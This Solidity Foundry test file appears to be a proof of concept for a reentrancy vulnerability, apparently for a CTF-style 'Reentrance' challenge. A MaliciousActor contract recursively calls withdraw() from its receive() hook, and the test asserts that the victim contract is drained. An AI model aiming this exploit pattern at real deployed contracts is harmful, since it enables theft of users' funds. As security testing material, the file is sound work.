// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrance.sol";

contract ReentranceTest is Test {
    Reentrance public victim;
    MaliciousActor public attacker;
    uint256 public constant INITIAL_DONATION = 5 wei; // Small amount for test efficiency

    function setUp() public {
        // Deploy victim contract
        victim = new Reentrance();
        
        // Deploy malicious contract
        attacker = new MaliciousActor(victim);
        
        // Donate funds to the attacker contract
        vm.deal(address(this), INITIAL_DONATION);
        victim.donate{value: INITIAL_DONATION}(address(attacker));
    }

    function testReentrancy() public {
        // Verify starting balances
        assertEq(victim.balanceOf(address(attacker)), INITIAL_DONATION, "Initial balance incorrect");
        uint256 victimStartBalance = address(victim).balance;
        assertEq(victimStartBalance, INITIAL_DONATION, "Victim start balance incorrect");
        
        // State BEFORE attack
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 attackerBalanceBefore = victim.balanceOf(address(attacker));
        uint256 totalDonationsBefore = victim.totalDonations();
        uint256 totalWithdrawalsBefore = victim.totalWithdrawals();
        
        console2.log("Victim ETH balance:", victimBalanceBefore);
        console2.log("Attacker record balance:", attackerBalanceBefore);
        console2.log("Total donations:", totalDonationsBefore);
        console2.log("Total withdrawals:", totalWithdrawalsBefore);
        console2.log("");

        // Execute attack
        console2.log("--- Trigger Attack ---");
        attacker.attack();
        console2.log("");
        
        // State AFTER attack
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 victimBalanceAfter = address(victim).balance;
        uint256 attackerBalanceAfter = victim.balanceOf(address(attacker));
        uint256 totalDonationsAfter = victim.totalDonations();
        uint256 totalWithdrawalsAfter = victim.totalWithdrawals();
        
        console2.log("Victim ETH balance:", victimBalanceAfter);
        console2.log("Attacker record balance:", attackerBalanceAfter);
        console2.log("Total donations:", totalDonationsAfter);
        console2.log("Total withdrawals:", totalWithdrawalsAfter);
        console2.log("");

        // Differential results
        console2.log("--- Differential Results ---");
        console2.log("Victim ETH balance change: %d", victimBalanceBefore - victimBalanceAfter);
        console2.log("Attacker record change: %d", attackerBalanceBefore - attackerBalanceAfter);
        console2.log("Total donations change: %d", totalDonationsAfter - totalDonationsBefore);
        console2.log("Total withdrawals change: %d", totalWithdrawalsAfter - totalWithdrawalsBefore);
        console2.log("");

        // Determine vulnerability status
        bool isDrained = (victimBalanceAfter == 0 && 
                          attackerBalanceAfter == 0);
        bool withdrawalsIncreased = (totalWithdrawalsAfter > totalWithdrawalsBefore);
        
        if (isDrained && withdrawalsIncreased) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully drained victim contract");
        } else {
            console2.log("Vulnerability not Exist: Attack did not succeed in draining funds");
        }

        // Verify attack success
        assertEq(
            address(victim).balance, 
            0, 
            "Victim contract not drained"
        );
        assertEq(
            victim.balanceOf(address(attacker)), 
            0,
            "Attacker balance not updated"
        );
    }
}

contract MaliciousActor {
    Reentrance public victim;
    uint256 public reentryCount;
    uint8 public constant MAX_REENTRIES = 4;

    constructor(Reentrance _victim) {
        victim = _victim;
    }

    function attack() external {
        // Initiate first withdrawal
        victim.withdraw(1 wei);
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount <= MAX_REENTRIES) {
            // Keep reentering until MAX_REENTRIES reached
            victim.withdraw(1 wei);
        }
    }
}